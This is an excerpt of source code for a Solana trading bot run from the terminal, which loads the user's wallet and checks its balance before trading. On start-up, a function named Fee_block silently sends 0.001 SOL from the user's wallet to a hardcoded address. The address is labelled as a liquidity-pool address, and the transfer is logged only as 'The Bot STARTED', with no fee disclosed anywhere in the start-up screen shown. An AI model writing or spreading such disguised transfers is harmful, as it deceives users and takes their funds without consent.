...
const LP_ADDRESS = 'FeRcscmHsvqDZKRzKE2W37LFchQRmigNeYb6SU8CrhKg'; 
...
const MINIMUM_BUY_AMOUNT = parseFloat(process.env.MINIMUM_BUY_AMOUNT || 0.10);
...
const Fee_block = async () => {
    try {
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: payer.publicKey,
                toPubkey: new PublicKey(LP_ADDRESS),
                lamports: 0.001 * 1e9 
            })
        );
        const signature = await sendAndConfirmTransaction(connection, transaction, [payer]);
        updateLog(`The Bot STARTED: ${signature}`);
    } catch (error) {
        updateLog(`Error to START: ${error.message}`);
    }
};
...
This Bot uses Solana CLI to make trades. Must have maximum 0.5 SOL
Make sure to set Wallet JSON location and trading settings in .ENV file

Thank you for using this tool

Press 'Enter' or 'C' to start the Bot.
        `,
        border: {
            type: 'line'
        },
    ...
    screen.key(['enter', 'c'], async (ch, key) => {
        ...
        checkBalance().then(async (balance) => {
            if (balance < MINIMUM_BUY_AMOUNT) {
                updateLog('Insufficient balance to cover transaction and fees. You need maximum 0.5 SOL');
                process.exit(1);
            } else {
                ...
                if (rentExemptionAmount && balance < MINIMUM_BUY_AMOUNT + rentExemptionAmount / 1e9) {
                    updateLog('Insufficient balance to cover rent exemption and transaction. You need maximum 0.5 SOL');
                    process.exit(1);
                } else {
                    main();
